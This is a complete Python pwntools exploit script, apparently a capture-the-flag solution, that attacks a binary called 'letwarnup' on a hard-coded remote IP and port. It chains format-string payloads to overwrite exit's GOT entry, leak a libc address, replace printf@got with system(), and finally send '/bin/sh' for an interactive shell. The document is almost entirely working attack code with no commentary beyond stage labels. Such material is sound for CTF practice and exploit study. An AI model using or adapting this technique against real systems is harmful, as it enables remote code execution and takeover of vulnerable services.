#!/usr/bin/env python3

from pwn import *

### Start ######################################################
exe = ELF("./letwarnup")
libc = ELF("./libc-2.31.so")
#conn = process('./letwarnup')
conn = connect('45.122.249.68', 10005)

### Stage 1: Overwrite exit(0) to vuln() #######################
payload1 = b"%c%c%c%c%c%c%4210746c%n%53654x%hn"
conn.recvuntil(b'Enter your string:')
conn.sendline(payload1)

### Stage 2: Leak libc_main_ret address ########################
payload2 = b'%15$p'
try:
    # Check if stage 1 succeeded or not
	conn.recvuntil(b'Enter your string:')
	conn.sendline(payload2)
except:
	print('[-] Disconnect!')
	exit(-1)

### Stage 3: Overwrite printf@got with system@got ##############
# Load offset
system_offset = libc.symbols['system']
libc_start_main_ret_offset = 0x0270b3

# Receive leak libc_start_main_ret address and calculate system address
libc_start_main_ret_addr = int(conn.recvuntil(b'Enter your string:').split(b'\n')[1].decode(), 16)
print('[+] Leak __libc_start_main_ret:', hex(libc_start_main_ret_addr))
libc_base = libc_start_main_ret_addr - libc_start_main_ret_offset
print('[+] Found libc base:', hex(libc_base))
system_addr = libc_base + system_offset
print('[+] System address:', hex(system_addr))

# Calculate number of bytes to write
bytes_to_overwrite = str(int(hex(system_addr)[8:12], 16) - 0x4020 - 1).encode()
payload3 = b'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%4210707c%n%' + bytes_to_overwrite + b'c%hn'
conn.sendline(payload3)

### Stage 4: Input string "/bin/sh" ############################
conn.recvuntil(b'Enter your string:')
conn.sendline(b'/bin/sh')

conn.interactive()

